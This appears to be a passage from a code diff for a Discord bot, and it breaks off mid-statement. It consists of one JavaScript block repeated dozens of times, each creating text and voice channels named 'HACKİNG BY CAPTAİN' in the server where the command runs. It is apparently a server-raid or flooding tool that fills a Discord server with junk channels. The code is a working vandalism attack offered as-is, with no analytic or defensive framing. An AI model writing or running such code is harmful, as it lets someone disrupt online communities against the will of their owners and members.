+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
